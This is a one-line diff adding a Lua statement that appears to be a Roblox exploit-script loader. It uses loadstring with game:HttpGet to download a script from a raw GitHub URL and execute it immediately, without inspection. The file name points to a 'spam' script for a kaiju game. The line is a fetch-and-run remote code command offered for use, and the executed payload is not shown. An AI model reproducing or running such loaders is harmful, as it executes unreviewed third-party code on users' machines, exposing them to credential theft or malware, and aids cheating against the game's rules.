@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/mechagodzilla2021-remodel-kaiju-alpha-spam5-rwwgkabgo96vy6.lua"))()
